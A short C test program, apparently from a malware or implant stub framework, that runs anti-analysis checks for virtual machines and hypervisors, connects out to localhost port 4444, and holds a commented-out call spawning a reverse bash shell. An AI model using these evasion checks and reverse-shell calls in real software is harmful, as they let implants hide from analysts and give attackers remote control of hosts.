/*-----------------------------------------------------------------------\
| Copyright (C) 2018  Lilly Chalupowski                                  |
|                                                                        |
| This program is free software: you can redistribute it and/or modify   |
| it under the terms of the GNU General Public License as published by   |
| the Free Software Foundation, either version 3 of the License, or      |
| (at your option) any later version.                                    |
|                                                                        |
| This program is distributed in the hope that it will be useful,        |
| but WITHOUT ANY WARRANTY; without even the implied warranty of         |
| MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the          |
| GNU General Public License for more details.                           |
|                                                                        |
| You should have received a copy of the GNU General Public License      |
| along with this program.  If not, see <https://www.gnu.org/licenses/>. |
\-----------------------------------------------------------------------*/

#include <stdio.h>
#include <string.h>
#include <stdbool.h>
#include "include/stub/net.h"
#include "include/stub/re.h"
int main(){
  //shell_spawn_reverse_tcp("127.0.0.1", 6666, SHELL_BASH, SHELL_ASYNC_TRUE);
  //printf("breakpoints: %d\n", re_breakpoints());
  if (re_kernel_modules() == true){
    printf("stop using a VM!\n");
  }
  if (re_hypervisor() == true){
    printf("stop using a hypervisor!\n");
  }
  net_client("127.0.0.1", 4444);
  return 0;
}
